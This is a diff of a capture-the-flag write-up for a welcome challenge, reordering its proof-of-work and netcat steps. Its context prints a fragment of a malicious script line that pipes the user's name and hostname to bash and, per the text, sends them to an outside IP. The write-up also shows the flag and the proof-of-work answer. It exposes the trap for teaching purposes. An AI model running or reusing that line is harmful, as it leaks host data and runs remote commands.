@@ -49,6 +49,11 @@ global i;i+=1337;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USER
 It sends our username and hostname to ```34.65.187.141``` and blocks us from getting the flag, even after getting the proof of work. So the solution is to simply comment out that line.
 
 ```
+$ python pow.py f49122
+7319391
+```
+
+```
 $ nc welcome.insomnihack.ch 1337
 
 ======================================================================
@@ -60,11 +65,6 @@ Give me an input whose md5sum starts with "f49122" and get the flag ;)
 
 MITM are real: check SHA, check code, ...
 INS{Miss me with that fhisy line}
-```
-
-```
-$ python pow.py f49122
-7319391
 ```
 
 ## web
